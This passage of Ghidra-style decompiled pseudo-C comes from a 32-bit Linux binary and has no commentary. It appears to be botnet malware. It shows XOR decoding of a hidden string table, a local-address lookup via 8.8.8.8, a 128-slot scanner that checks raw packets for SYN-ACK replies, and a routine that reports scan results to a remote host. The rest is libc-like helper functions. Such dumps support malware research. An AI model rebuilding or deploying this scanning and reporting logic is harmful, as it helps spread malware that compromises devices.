                      *(short *)((int)ppiVar23 + 0x75a) = (short)iVar11;
                      *(undefined4 *)((int)ppiVar23 + -4) = 0x805135b;
                      iVar7 = FUN_080544c5();
                      if ((iVar7 < 1) && (iVar7 != -1)) {
                        *(undefined4 *)((int)ppiVar23 + -4) = extraout_ECX;
                        *(undefined4 *)((int)ppiVar23 + -8) = 0;
                        *(undefined4 *)((int)ppiVar23 + -0xc) = 1;
                        *(undefined4 *)((int)ppiVar23 + -0x10) = 2;
                        *(undefined4 *)((int)ppiVar23 + -0x14) = 0x805158b;
                        iVar7 = FUN_080543a4();
                        *(int *)((int)ppiVar23 + 0x28) = iVar7;
                        if (iVar7 == -1) goto LAB_0805090d;
                        *(undefined4 *)((int)ppiVar23 + -0x10) = 0x12;
                        *(undefined4 *)((int)ppiVar23 + -0x14) = 0x80515a3;
                        FUN_08051840();
                        *(undefined4 *)((int)ppiVar23 + -0x10) = 0x13;
                        *(undefined4 *)((int)ppiVar23 + -0x14) = 0x80515af;
                        FUN_08051840();
                        *(undefined4 *)((int)ppiVar23 + -0xc) = 0;
                        *(undefined4 *)((int)ppiVar23 + -0x10) = 0x12;
                        *(undefined4 *)((int)ppiVar23 + -0x14) = 0x80515ba;
                        uVar13 = FUN_08051790();
                        *(undefined4 *)((int)ppiVar23 + -0x10) = uVar13;
                        *(undefined4 *)((int)ppiVar23 + -0x14) = 0x80515c2;
                        pbVar14 = (byte *)FUN_0804f750();
                        if (pbVar14 != (byte *)0x0) goto code_r0x080515cf;
                      }
                      *(int *)((int)ppiVar23 + -0x10) = unaff_EDI[1];
                      *(undefined4 *)((int)ppiVar23 + -0x14) = 0x805136f;
                      FUN_08054c95();
                      unaff_EDI[1] = -1;
                      unaff_EDI[3] = 0;
                    }
LAB_08051073:
                    if (unaff_EBP == (int *)0x0) goto code_r0x0805107b;
                  }
                  piVar10 = (int *)unaff_EDI[6];
                  piVar20 = unaff_EBP;
                  if ((int)piVar10 < (int)unaff_EBP) {
                    piVar20 = piVar10;
                  }
                  unaff_EDI[6] = (int)piVar10 - (int)piVar20;
                  *(int **)((int)ppiVar23 + -4) = unaff_EBP;
                  *(int *)((int)ppiVar23 + -8) = (int)piVar10 - (int)piVar20;
                  *(int *)((int)ppiVar23 + -0xc) = *(int *)((int)ppiVar23 + 0x18) + (int)piVar20;
                  *(undefined4 *)((int)ppiVar23 + -0x10) = *(undefined4 *)((int)ppiVar23 + 0x18);
                  *(undefined4 *)((int)ppiVar23 + -0x14) = 0x8050c29;
                  FUN_080548f8();
                  goto LAB_08050b75;
                }
              }
LAB_08051086:
              iVar7 = *(int *)((int)ppiVar23 + 0x750) + 1;
              *(int *)((int)ppiVar23 + 0x750) = iVar7;
              if (0x7f < iVar7) goto LAB_08050503;
            } while( true );
          }
        } while( true );
      }
      *(undefined4 *)(puVar22 + -4) = 0x805077d;
      piVar10 = (int *)FUN_080528b0();
      if (*piVar10 == 0xb) goto LAB_08050932;
      *(undefined4 *)(puVar22 + -4) = 0x805078b;
      piVar10 = (int *)FUN_080528b0();
      if (*piVar10 == 0xb) goto LAB_08050932;
    } while (((uVar8 < 0x28) || (*(int *)(puVar22 + 0x4a) != DAT_080576dc)) ||
            (puVar22[0x43] != '\x06'));
    uVar13 = *(undefined4 *)(puVar22 + 0x4e);
    *(undefined4 *)(puVar22 + -0x10) = 0x17;
    *(undefined4 *)(puVar22 + -0x14) = 0x80507ba;
    sVar6 = FUN_080540b4();
    if ((short)uVar13 != sVar6) {
      uVar13 = *(undefined4 *)(puVar22 + 0x4e);
      *(undefined4 *)(puVar22 + -0x10) = 0x913;
      *(undefined4 *)(puVar22 + -0x14) = 0x80507d3;
      sVar6 = FUN_080540b4();
      if ((short)uVar13 != sVar6) goto LAB_08050740;
    }
    if (((*(short *)(puVar22 + 0x50) == *(short *)(puVar22 + 0x1e)) &&
        (bVar17 = puVar22[0x5b], (bVar17 & 2) != 0)) &&
       (((bVar17 & 0x10) != 0 && (((bVar17 & 4) == 0 && ((bVar17 & 1) == 0)))))) {
      *(undefined4 *)(puVar22 + -0x10) = *(undefined4 *)(puVar22 + 0x56);
      *(undefined4 *)(puVar22 + -0x14) = 0x8050820;
      iVar11 = FUN_08054228();
      *(int *)(puVar22 + -0x10) = iVar11 + -1;
      *(undefined4 *)(puVar22 + -0x14) = 0x8050829;
      iVar11 = FUN_08054088();
      if (iVar11 == *(int *)(puVar22 + 0x46)) {
        if (0x7f < iVar7) goto LAB_08050932;
        iVar11 = iVar7 * 0x120 + DAT_080576f0;
        if (*(int *)(iVar11 + 0xc) != 0) {
          iVar19 = DAT_080576f0 + (iVar7 * 9 + 9) * 0x20;
          do {
            iVar11 = iVar19;
            iVar7 = iVar7 + 1;
            if (iVar7 == 0x80) goto LAB_08050932;
            iVar19 = iVar11 + 0x120;
          } while (*(int *)(iVar11 + 0xc) != 0);
        }
        if (iVar11 == 0) goto LAB_08050932;
        uVar13 = *(undefined4 *)(puVar22 + 0x4e);
        *(int *)(iVar11 + 0x10) = *(int *)(puVar22 + 0x46);
        *(short *)(iVar11 + 0x14) = (short)uVar13;
        *(undefined4 *)(puVar22 + -4) = 0x8050899;
        FUN_0804fc90();
      }
    }
    goto LAB_08050740;
  }
  goto LAB_0805051e;
LAB_0805090d:
  puVar22 = (undefined *)((int)ppiVar23 + -0x10);
  *(undefined4 *)((int)ppiVar23 + -0x10) = 0;
  *(undefined4 *)((int)ppiVar23 + -0x14) = 0x8050917;
  FUN_080528bd();
LAB_08050917:
  *(undefined4 *)(puVar22 + -0x10) = 0x913;
  *(undefined4 *)(puVar22 + -0x14) = 0x8050924;
  DAT_08057136 = FUN_080540b4();
  goto LAB_0805069b;
code_r0x080515cf:
  *(undefined2 *)((int)ppiVar23 + 0x724) = 2;
  iVar7 = *(int *)(pbVar14 + 4);
  *(undefined4 *)((int)ppiVar23 + -4) = 0x80515e1;
  uVar8 = FUN_0804f4a0();
  uVar13 = *(undefined4 *)(iVar7 + (uVar8 % (uint)*pbVar14) * 4);
  *(undefined4 *)((int)ppiVar23 + 0x728) = uVar13;
  *(undefined4 *)((int)ppiVar23 + -4) = uVar13;
  *(undefined4 *)((int)ppiVar23 + -8) = uVar13;
  *(undefined4 *)((int)ppiVar23 + -0xc) = 0;
  *(undefined4 *)((int)ppiVar23 + -0x10) = 0x13;
  *(undefined4 *)((int)ppiVar23 + -0x14) = 0x8051600;
  puVar15 = (undefined2 *)FUN_08051790();
  uVar2 = *puVar15;
  *(byte **)((int)ppiVar23 + -0x10) = pbVar14;
  *(undefined2 *)((int)ppiVar23 + 0x726) = uVar2;
  *(undefined4 *)((int)ppiVar23 + -0x14) = 0x8051613;
  FUN_0804f710();
  *(undefined4 *)((int)ppiVar23 + -0x10) = 0x12;
  *(undefined4 *)((int)ppiVar23 + -0x14) = 0x805161f;
  FUN_080517c0();
  *(undefined4 *)((int)ppiVar23 + -0x10) = 0x13;
  *(undefined4 *)((int)ppiVar23 + -0x14) = 0x805162b;
  FUN_080517c0();
  *(undefined4 *)((int)ppiVar23 + -8) = 0x10;
  *(undefined **)((int)ppiVar23 + -0xc) = (undefined *)((int)ppiVar23 + 0x724);
  *(undefined4 *)((int)ppiVar23 + -0x10) = *(undefined4 *)((int)ppiVar23 + 0x28);
  *(undefined4 *)((int)ppiVar23 + -0x14) = 0x8051642;
  iVar11 = FUN_08053f88();
  if (iVar11 != -1) {
    *(undefined *)((int)ppiVar23 + 0x74c) = 0;
    *(undefined4 *)((int)ppiVar23 + -4) = 0x4000;
    *(undefined4 *)((int)ppiVar23 + -8) = 1;
    *(undefined **)((int)ppiVar23 + -0xc) = (undefined *)((int)ppiVar23 + 0x74c);
    unaff_EBP = *(int **)((int)ppiVar23 + 0x28);
    *(int **)((int)ppiVar23 + -0x10) = unaff_EBP;
    *(undefined4 *)((int)ppiVar23 + -0x14) = 0x80516df;
    FUN_080542d8();
    *(undefined4 *)((int)ppiVar23 + -0x14) = 0x4000;
    *(undefined4 *)((int)ppiVar23 + -0x18) = 4;
    *(undefined **)((int)ppiVar23 + -0x1c) = (undefined *)((int)ppiVar23 + 0x748);
    unaff_EDI = *(int **)((int)ppiVar23 + 0x28);
    *(int **)((int)ppiVar23 + -0x20) = unaff_EDI;
    *(undefined4 *)((int)ppiVar23 + -0x24) = 0x80516f8;
    FUN_080542d8();
    *(undefined4 *)((int)ppiVar23 + -4) = 0x4000;
    *(undefined4 *)((int)ppiVar23 + -8) = 2;
    *(undefined **)((int)ppiVar23 + -0xc) = (undefined *)((int)ppiVar23 + 0x75a);
    pbVar14 = *(byte **)((int)ppiVar23 + 0x28);
    *(byte **)((int)ppiVar23 + -0x10) = pbVar14;
    *(undefined4 *)((int)ppiVar23 + -0x14) = 0x8051714;
    FUN_080542d8();
    *(undefined4 *)((int)ppiVar23 + -0x14) = 0x4000;
    *(undefined4 *)((int)ppiVar23 + -0x18) = 1;
    *(int *)((int)ppiVar23 + -0x1c) = *(int *)((int)ppiVar23 + 0x24) + 0xc;
    iVar7 = *(int *)((int)ppiVar23 + 0x28);
    *(int *)((int)ppiVar23 + -0x20) = iVar7;
    *(undefined4 *)((int)ppiVar23 + -0x24) = 0x805172d;
    FUN_080542d8();
    *(undefined4 *)((int)ppiVar23 + -4) = 0x4000;
    *(uint *)((int)ppiVar23 + -8) = (uint)*(byte *)(*(undefined4 **)((int)ppiVar23 + 0x24) + 3);
    *(undefined4 *)((int)ppiVar23 + -0xc) = **(undefined4 **)((int)ppiVar23 + 0x24);
    *(undefined4 *)((int)ppiVar23 + -0x10) = *(undefined4 *)((int)ppiVar23 + 0x28);
    *(undefined4 *)((int)ppiVar23 + -0x14) = 0x805174c;
    FUN_080542d8();
    *(undefined4 *)((int)ppiVar23 + -0x14) = 0x4000;
    *(undefined4 *)((int)ppiVar23 + -0x18) = 1;
    *(int *)((int)ppiVar23 + -0x1c) = *(int *)((int)ppiVar23 + 0x24) + 0xd;
    *(undefined4 *)((int)ppiVar23 + -0x20) = *(undefined4 *)((int)ppiVar23 + 0x28);
    *(undefined4 *)((int)ppiVar23 + -0x24) = 0x8051765;
    FUN_080542d8();
    *(undefined4 *)((int)ppiVar23 + -4) = 0x4000;
    *(uint *)((int)ppiVar23 + -8) = (uint)*(byte *)(*(int *)((int)ppiVar23 + 0x24) + 0xd);
    *(undefined4 *)((int)ppiVar23 + -0xc) = *(undefined4 *)(*(int *)((int)ppiVar23 + 0x24) + 4);
    *(undefined4 *)((int)ppiVar23 + -0x10) = *(undefined4 *)((int)ppiVar23 + 0x28);
    *(undefined4 *)((int)ppiVar23 + -0x14) = 0x8051785;
    FUN_080542d8();
  }
  puVar22 = (undefined *)((int)ppiVar23 + -0x10);
  *(undefined4 *)((int)ppiVar23 + -0x10) = *(undefined4 *)((int)ppiVar23 + 0x28);
  *(undefined4 *)((int)ppiVar23 + -0x14) = 0x8051655;
  FUN_08054c95();
  *(undefined4 *)((int)ppiVar23 + -0x10) = 0;
  *(undefined4 *)((int)ppiVar23 + -0x14) = 0x8051661;
  FUN_080528bd();
LAB_08051661:
  piVar10 = *(int **)(iVar7 + 4);
  *(uint *)(puVar22 + ((uint)piVar10 >> 5) * 4 + 0x624) =
       *(uint *)(puVar22 + ((uint)piVar10 >> 5) * 4 + 0x624) |
       (int)pbVar14 << ((byte)piVar10 & 0x1f);
  if ((int)unaff_EDI < (int)piVar10) {
    unaff_EDI = piVar10;
  }
  goto LAB_080509a6;
code_r0x0805125e:
  *(undefined4 *)((int)ppiVar23 + -4) = 0x4000;
  *(undefined4 *)((int)ppiVar23 + -8) = 3;
  pcVar21 = pcVar21 + 3;
  *(undefined **)((int)ppiVar23 + -0xc) = (undefined *)((int)ppiVar23 + 0x757);
  unaff_EBP = (int *)((int)unaff_EBP + 3);
  *(int *)((int)ppiVar23 + -0x10) = unaff_EDI[1];
  *(undefined4 *)((int)ppiVar23 + -0x14) = 0x805127c;
  FUN_080542d8();
  *(undefined4 *)((int)ppiVar23 + -0x14) = 0x4000;
  *(undefined4 *)((int)ppiVar23 + -0x18) = 9;
  *(undefined **)((int)ppiVar23 + -0x1c) = (undefined *)((int)ppiVar23 + 0x737);
  *(int *)((int)ppiVar23 + -0x20) = unaff_EDI[1];
  *(undefined4 *)((int)ppiVar23 + -0x24) = 0x8051294;
  FUN_080542d8();
  iVar7 = unaff_EDI[6];
  goto LAB_08051141;
code_r0x0805107b:
  iVar7 = unaff_EDI[3];
  goto joined_r0x08050b02;
}



undefined4 FUN_08051790(int param_1,uint *param_2)

{
  if (param_2 != (uint *)0x0) {
    *param_2 = *(uint *)(&DAT_08057704 + param_1 * 8) & 0xffff;
  }
  return *(undefined4 *)(&DAT_08057700 + param_1 * 8);
}



void FUN_080517c0(byte param_1)

{
  int iVar1;
  int *piVar2;
  uint uVar3;
  undefined4 uVar4;
  int iVar5;
  int iVar6;
  
  uVar4 = DAT_08057080;
  iVar1 = (uint)param_1 * 8;
  piVar2 = (int *)(&DAT_08057700 + iVar1);
  if (*(short *)(&DAT_08057704 + iVar1) != 0) {
    uVar3 = (uint)DAT_08057080 >> 0x18;
    iVar5 = 0;
    do {
      *(byte *)(iVar5 + *piVar2) = *(byte *)(iVar5 + *piVar2) ^ (byte)uVar4;
      *(byte *)(iVar5 + *piVar2) = *(byte *)(iVar5 + *piVar2) ^ (byte)((uint)uVar4 >> 8);
      *(byte *)(iVar5 + *piVar2) = *(byte *)(iVar5 + *piVar2) ^ (byte)((uint)uVar4 >> 0x10);
      iVar6 = iVar5 + 1;
      *(byte *)(iVar5 + *piVar2) = *(byte *)(iVar5 + *piVar2) ^ (byte)uVar3;
      iVar5 = iVar6;
    } while (iVar6 < (int)(*(uint *)(&DAT_08057704 + iVar1) & 0xffff));
  }
  return;
}



void FUN_08051840(byte param_1)

{
  int iVar1;
  int *piVar2;
  uint uVar3;
  undefined4 uVar4;
  int iVar5;
  int iVar6;
  
  uVar4 = DAT_08057080;
  iVar1 = (uint)param_1 * 8;
  piVar2 = (int *)(&DAT_08057700 + iVar1);
  if (*(short *)(&DAT_08057704 + iVar1) != 0) {
    uVar3 = (uint)DAT_08057080 >> 0x18;
    iVar5 = 0;
    do {
      *(byte *)(iVar5 + *piVar2) = *(byte *)(iVar5 + *piVar2) ^ (byte)uVar4;
      *(byte *)(iVar5 + *piVar2) = *(byte *)(iVar5 + *piVar2) ^ (byte)((uint)uVar4 >> 8);
      *(byte *)(iVar5 + *piVar2) = *(byte *)(iVar5 + *piVar2) ^ (byte)((uint)uVar4 >> 0x10);
      iVar6 = iVar5 + 1;
      *(byte *)(iVar5 + *piVar2) = *(byte *)(iVar5 + *piVar2) ^ (byte)uVar3;
      iVar5 = iVar6;
    } while (iVar6 < (int)(*(uint *)(&DAT_08057704 + iVar1) & 0xffff));
  }
  return;
}



void FUN_08052190(char *param_1)

{
  char cVar1;
  int iVar2;
  
  iVar2 = 0;
  cVar1 = *param_1;
  while (cVar1 != '\0') {
    iVar2 = iVar2 + 1;
    cVar1 = param_1[iVar2];
  }
  return;
}



int FUN_080521b0(char *param_1,char *param_2)

{
  char cVar1;
  char cVar2;
  int iVar3;
  int iVar4;
  
  iVar4 = 0;
  cVar2 = *param_2;
  cVar1 = cVar2;
  while (iVar3 = iVar4, cVar1 != '\0') {
    iVar4 = iVar4 + 1;
    cVar1 = param_2[iVar4];
  }
  while( true ) {
    *param_1 = cVar2;
    param_1 = param_1 + 1;
    if (iVar3 + -1 == -1) break;
    cVar2 = param_2[1];
    param_2 = param_2 + 1;
    iVar3 = iVar3 + -1;
  }
  return iVar4;
}



void FUN_080521f0(int param_1,int param_2,int param_3)

{
  int iVar1;
  
  if (param_3 != 0) {
    iVar1 = 0;
    do {
      *(undefined *)(iVar1 + param_1) = *(undefined *)(iVar1 + param_2);
      iVar1 = iVar1 + 1;
    } while (iVar1 != param_3);
  }
  return;
}



void FUN_08052220(int param_1,int param_2)

{
  int iVar1;
  
  if (param_2 != 0) {
    iVar1 = 0;
    do {
      *(undefined *)(iVar1 + param_1) = 0;
      iVar1 = iVar1 + 1;
    } while (iVar1 != param_2);
  }
  return;
}



int FUN_08052240(int param_1,int param_2,int param_3,int param_4)

{
  int iVar1;
  int iVar2;
  
  if ((param_4 <= param_2) && (0 < param_2)) {
    iVar2 = 0;
    iVar1 = 0;
    do {
      if (*(char *)(iVar2 + param_1) == *(char *)(param_3 + iVar1)) {
        iVar1 = iVar1 + 1;
        if (iVar1 == param_4) {
          return iVar2 + 1;
        }
      }
      else {
        iVar1 = 0;
      }
      iVar2 = iVar2 + 1;
    } while (iVar2 != param_2);
  }
  return -1;
}



uint FUN_08052290(char *param_1,uint param_2)

{
  char cVar1;
  bool bVar2;
  uint uVar3;
  char *pcVar4;
  uint uVar5;
  int iVar6;
  int iVar7;
  
  do {
    do {
      pcVar4 = param_1;
      cVar1 = *pcVar4;
      param_1 = pcVar4 + 1;
    } while (cVar1 == ' ');
  } while ((cVar1 == '\t') || (cVar1 == '\n'));
  if (cVar1 == '-') {
    cVar1 = *param_1;
    uVar3 = 0x80000000;
    param_1 = pcVar4 + 2;
    bVar2 = true;
  }
  else {
    if (cVar1 == '+') {
      cVar1 = *param_1;
      param_1 = pcVar4 + 2;
    }
    uVar3 = 0x7fffffff;
    bVar2 = false;
  }
  uVar5 = 0;
  iVar7 = 0;
  do {
    if ((byte)(cVar1 - 0x30U) < 10) {
      iVar6 = cVar1 + -0x30;
    }
    else {
      iVar6 = 0x37;
      if (0x19 < (byte)(cVar1 + 0xbfU)) {
        if (0x19 < (byte)(cVar1 + 0x9fU)) {
LAB_08052325:
          if (-1 < iVar7) {
            if (bVar2) {
              uVar5 = -uVar5;
            }
            return uVar5;
          }
          return 0x80000000 - !bVar2;
        }
        iVar6 = 0x57;
      }
      iVar6 = cVar1 - iVar6;
    }
    if ((int)param_2 <= iVar6) goto LAB_08052325;
    if (((iVar7 < 0) || (uVar3 / param_2 < uVar5)) ||
       ((uVar5 == uVar3 / param_2 && ((int)(uVar3 % param_2) < iVar6)))) {
      iVar7 = -1;
    }
    else {
      iVar7 = 1;
      uVar5 = iVar6 + param_2 * uVar5;
    }
    cVar1 = *param_1;
    param_1 = param_1 + 1;
  } while( true );
}



uint FUN_08052390(uint param_1,int param_2,undefined4 param_3)

{
  char *pcVar1;
  int iVar2;
  undefined4 in_ECX;
  undefined4 extraout_ECX;
  int iVar3;
  int iVar4;
  
  iVar3 = 0;
  do {
    iVar2 = FUN_08054ce8(param_3,iVar3 + param_1,1,in_ECX);
    iVar4 = iVar3;
    if (iVar2 != 1) break;
    iVar4 = iVar3 + 1;
    if (param_2 <= iVar4) {
      return param_1;
    }
    pcVar1 = (char *)(iVar3 + param_1);
    in_ECX = extraout_ECX;
    iVar3 = iVar4;
  } while (*pcVar1 != '\n');
  return param_1 & -(uint)(iVar4 != 0);
}



undefined4 FUN_080523e0(void)

{
  undefined4 *puVar1;
  int iVar2;
  undefined2 uStack_1c;
  undefined2 uStack_1a;
  undefined4 uStack_18;
  undefined4 uStack_c;
  
  uStack_c = 0x10;
  puVar1 = (undefined4 *)FUN_080528b0();
  *puVar1 = 0;
  iVar2 = FUN_080543a4(2,2,0);
  uStack_18 = 0;
  if (iVar2 != -1) {
    uStack_1c = 2;
    uStack_18 = FUN_08054088(0x8080808);
    uStack_1a = FUN_080540b4(0x35);
    FUN_08053f88(iVar2,&uStack_1c,0x10);
    FUN_08053fe0(iVar2,&uStack_1c,&uStack_c);
    FUN_08054c95(iVar2);
  }
  return uStack_18;
}



int FUN_08052470(byte *param_1,int param_2,char *param_3)

{
  char cVar1;
  byte bVar2;
  byte bVar3;
  byte *pbVar4;
  int iVar5;
  int iStack_14;
  
  iStack_14 = 0;
  cVar1 = *param_3;
  while (cVar1 != '\0') {
    iStack_14 = iStack_14 + 1;
    cVar1 = param_3[iStack_14];
  }
  iVar5 = 0;
  pbVar4 = param_1;
  if (0 < param_2) {
    do {
      bVar2 = *pbVar4;
      bVar3 = param_3[iVar5];
      pbVar4 = pbVar4 + 1;
      if ((byte)(bVar2 + 0xbf) < 0x1a) {
        bVar2 = bVar2 | 0x60;
      }
      if ((byte)(bVar3 + 0xbf) < 0x1a) {
        bVar3 = bVar3 | 0x60;
      }
      if (bVar2 == bVar3) {
        iVar5 = iVar5 + 1;
        if (iStack_14 == iVar5) {
          return (int)pbVar4 - (int)param_1;
        }
      }
      else {
        iVar5 = 0;
      }
      param_2 = param_2 + -1;
    } while (0 < param_2);
  }
  return -1;
}



undefined4 FUN_080524f0(char *param_1,char *param_2)

{
  char cVar1;
  int iVar2;
  int iVar3;
  
  iVar3 = 0;
  cVar1 = *param_1;
  while (cVar1 != '\0') {
    iVar3 = iVar3 + 1;
    cVar1 = param_1[iVar3];
  }
  iVar2 = 0;
  cVar1 = *param_2;
  while (cVar1 != '\0') {
    iVar2 = iVar2 + 1;
    cVar1 = param_2[iVar2];
  }
  if (iVar3 == iVar2) {
    while( true ) {
      iVar3 = iVar3 + -1;
      if (iVar3 == -1) {
        return 1;
      }
      if (*param_1 != *param_2) break;
      param_1 = param_1 + 1;
      param_2 = param_2 + 1;
    }
  }
  return 0;
}



undefined4 FUN_08052540(char *param_1,char *param_2,int param_3)

{
  char cVar1;
  int iVar2;
  int iVar3;
  
  iVar3 = 0;
  cVar1 = *param_1;
  while (cVar1 != '\0') {
    iVar3 = iVar3 + 1;
    cVar1 = param_1[iVar3];
  }
  iVar2 = 0;
  cVar1 = *param_2;
  while (cVar1 != '\0') {
    iVar2 = iVar2 + 1;
    cVar1 = param_2[iVar2];
  }
  if ((param_3 <= iVar3) && (param_3 <= iVar2)) {
    while( true ) {
      param_3 = param_3 + -1;
      if (param_3 == -1) {
        return 1;
      }
      if (*param_1 != *param_2) break;
      param_1 = param_1 + 1;
      param_2 = param_2 + 1;
    }
  }
  return 0;
}



char * FUN_08052590(uint param_1,uint param_2,char *param_3)

{
  char cVar1;
  bool bVar2;
  char cVar3;
  char *pcVar4;
  char *pcVar5;
  int iVar6;
  int iVar7;
  char acStack_33 [34];
  undefined uStack_11;
  
  if (param_3 != (char *)0x0) {
    if (param_1 == 0) {
      *param_3 = '0';
      param_3[1] = '\0';
      return param_3;
    }
    uStack_11 = 0;
    if ((param_2 == 10) && ((int)param_1 < 0)) {
      bVar2 = true;
      param_1 = -param_1;
    }
    else {
      bVar2 = false;
    }
    iVar7 = 0x20;
    do {
      iVar6 = iVar7;
      cVar1 = (char)((ulonglong)param_1 % (ulonglong)param_2);
      cVar3 = cVar1 + '0';
      if (9 < (int)((ulonglong)param_1 % (ulonglong)param_2)) {
        cVar3 = cVar1 + '7';
      }
      acStack_33[iVar6 + 1] = cVar3;
      param_1 = param_1 / param_2;
      iVar7 = iVar6 + -1;
    } while (param_1 != 0);
    if (bVar2) {
      acStack_33[iVar6] = '-';
      iVar6 = iVar6 + -1;
    }
    pcVar4 = acStack_33 + iVar6 + 1;
    iVar7 = 0;
    cVar1 = *pcVar4;
    while (pcVar5 = param_3, cVar1 != '\0') {
      iVar7 = iVar7 + 1;
      cVar1 = pcVar4[iVar7];
    }
    do {
      iVar7 = iVar7 + -1;
      *pcVar5 = *pcVar4;
      pcVar4 = pcVar4 + 1;
      pcVar5 = pcVar5 + 1;
    } while (iVar7 != -1);
  }
  return param_3;
}



undefined4 FUN_08052654(undefined4 *param_1)

{
  undefined4 uVar1;
  
  uVar1 = FUN_08054c95(*param_1);
  FUN_080530c0(param_1);
  return uVar1;
}



undefined8 FUN_08052678(undefined4 param_1)

{
  int iVar1;
  int *piVar2;
  undefined4 uStack_c;
  
  iVar1 = FUN_08052a68(param_1,0x90000);
  piVar2 = (int *)0x0;
  if (-1 < iVar1) {
    piVar2 = (int *)FUN_08052be0(1,0x81c,0,0);
    if (piVar2 == (int *)0x0) {
      FUN_08052ae0();
      piVar2 = (int *)0x0;
    }
    else {
      *piVar2 = iVar1;
    }
  }
  return CONCAT44(uStack_c,piVar2);
}



int FUN_080526c0(int param_1)

{
  undefined4 uVar1;
  undefined4 uVar2;
  int iVar3;
  int *piVar4;
  
  if (*(int *)(param_1 + 0x10) <= *(int *)(param_1 + 0xc)) {
    iVar3 = FUN_08052ae0();
    if (iVar3 < 1) {
      if ((iVar3 < 0) && (iVar3 != -2)) {
        piVar4 = (int *)FUN_080528b0();
        *piVar4 = -iVar3;
      }
      return 0;
    }
    *(int *)(param_1 + 0x10) = iVar3;
    *(undefined4 *)(param_1 + 0xc) = 0;
  }
  iVar3 = *(int *)(param_1 + 0xc) + 0x1c + param_1;
  uVar1 = *(undefined4 *)(iVar3 + 8);
  *(uint *)(param_1 + 0xc) = (uint)*(ushort *)(iVar3 + 0x10) + *(int *)(param_1 + 0xc);
  uVar2 = *(undefined4 *)(iVar3 + 0xc);
  *(undefined4 *)(param_1 + 4) = uVar1;
  *(undefined4 *)(param_1 + 8) = uVar2;
  return iVar3;
}



void FUN_0805272d(void)

{
  return;
}



// WARNING: Globals starting with '_' overlap smaller symbols at the same address

int FUN_0805272e(code *param_1,int param_2,char **param_3)

{
  char **ppcVar1;
  char cVar2;
  char *pcVar3;
  char *pcVar4;
  char **ppcVar5;
  char *pcVar6;
  char *pcVar7;
  int iVar8;
  undefined4 uVar9;
  undefined4 in_ECX;
  char **ppcVar10;
  code **ppcVar11;
  int iVar12;
  int *in_GS_OFFSET;
  char *apcStack_c0 [6];
  undefined4 uStack_a8;
  int iStack_94;
  int iStack_90;
  int iStack_8c;
  int iStack_88;
  undefined4 uStack_80;
  int iStack_64;
  undefined4 uStack_5c;
  undefined4 uStack_40;
  undefined4 uStack_28;
  undefined4 uStack_24;
  undefined4 uStack_20;
  undefined4 uStack_1c;
  undefined4 uStack_18;
  undefined4 uStack_14;
  
  pcVar3 = *param_3;
  ppcVar1 = param_3 + param_2 + 1;
  ppcVar5 = ppcVar1;
  do {
    ppcVar10 = ppcVar5;
    ppcVar5 = ppcVar10 + 1;
  } while (*ppcVar10 != (char *)0x0);
  _DAT_08057594 = ppcVar1;
  FUN_0805492c(apcStack_c0,0,0x98,in_ECX);
  DAT_080578d0 = ppcVar10 + 1;
  for (; pcVar4 = ppcVar10[1], pcVar4 != (char *)0x0; ppcVar10 = ppcVar10 + 2) {
    if (pcVar4 < (char *)0x26) {
      apcStack_c0[(int)pcVar4] = ppcVar10[2];
    }
  }
  _DAT_080578a0 = uStack_80;
  _DAT_080578f4 = uStack_40;
  _DAT_080578d8 = uStack_a8;
  pcVar4 = pcVar3;
  pcVar6 = pcVar3;
  if (pcVar3 != (char *)0x0) {
    while( true ) {
      _DAT_08057154 = pcVar6;
      pcVar7 = pcVar4 + 1;
      cVar2 = *pcVar4;
      _DAT_08057158 = pcVar3;
      if (cVar2 == '\0') break;
      pcVar4 = pcVar7;
      pcVar6 = _DAT_08057154;
      if (cVar2 == '/') {
        pcVar6 = pcVar7;
      }
    }
  }
  FUN_08054e20(apcStack_c0);
  FUN_0805272d(uStack_5c);
  if (((iStack_94 != iStack_90) || (iStack_8c != iStack_88)) || (iStack_64 != 0)) {
    uStack_28 = 0;
    uStack_24 = 0;
    uStack_1c = 0;
    uStack_14 = 0;
    iVar12 = 0;
    uStack_20 = 1;
    uStack_18 = 2;
    FUN_08052ae0();
    do {
      if (((*(byte *)((int)&uStack_24 + iVar12 * 8 + 2) & 0x20) != 0) &&
         (iVar8 = FUN_08052ae0(), iVar8 < 0)) {
        do {
                    // WARNING: Do nothing block with infinite loop
        } while( true );
      }
      iVar12 = iVar12 + 1;
    } while (iVar12 != 3);
    _DAT_080578c8 = 1;
  }
  uVar9 = FUN_08048094();
  for (ppcVar11 = (code **)&DAT_08057048; ppcVar11 < &DAT_08057048; ppcVar11 = ppcVar11 + 1) {
    uVar9 = (**ppcVar11)();
  }
  uVar9 = (*param_1)(param_2,param_3,ppcVar1,uVar9);
  FUN_080528bd(uVar9);
  return *in_GS_OFFSET + 0x28;
}



int FUN_080528b0(void)

{
  int *in_GS_OFFSET;
  
  return *in_GS_OFFSET + 0x28;
}



void FUN_080528bc(void)

{
  return;
}



int FUN_080528bd(undefined4 param_1)

{
  int iVar1;
  code **ppcVar2;
  int iStack_38;
  int iStack_34;
  undefined4 uStack_18;
  int iStack_14;
  undefined auStack_c [8];
  
  ppcVar2 = (code **)&DAT_08057048;
  FUN_080528bc();
  while (&DAT_08057048 < ppcVar2) {
    ppcVar2 = ppcVar2 + -1;
    (**ppcVar2)();
  }
  FUN_080561f7();
  FUN_08055f8d();
  FUN_08054f64(param_1);
  if (iStack_14 != 4) {
    if (iStack_14 == 0xe) {
      iVar1 = thunk_FUN_08052b2b(0xdd,uStack_18,0xe,0x80528e4,0,0,0,auStack_c);
      goto LAB_08052a51;
    }
    if (iStack_14 == 9) {
      iVar1 = FUN_08052ae0();
      if (iVar1 == -0x16) {
        iVar1 = FUN_08052ae0();
        return iVar1;
      }
      if (iVar1 == 0) {
        if (iStack_38 != 2) {
          return iStack_34;
        }
        return -iStack_34;
      }
      goto LAB_08052a51;
    }
    if (iStack_14 == 0x406) {
      iVar1 = FUN_08052ae0();
      if (iVar1 == -0x16) {
        iVar1 = FUN_08052ae0();
        if (iVar1 == -0x16) {
          iVar1 = FUN_08052ae0();
          if (-1 < iVar1) {
            FUN_08052ae0();
          }
        }
        else {
          if (-1 < iVar1) {
            FUN_08052ae0();
          }
          iVar1 = -0x16;
        }
      }
      else if (-1 < iVar1) {
        FUN_08052ae0();
      }
      goto LAB_08052a51;
    }
  }
  iVar1 = FUN_08052ae0();
LAB_08052a51:
  iVar1 = FUN_08052b50(iVar1);
  return iVar1;
}



int FUN_080528f0(undefined4 param_1,int param_2,undefined4 param_3)

{
  int iVar1;
  int iStack_1c;
  int iStack_18;
  
  if (param_2 != 4) {
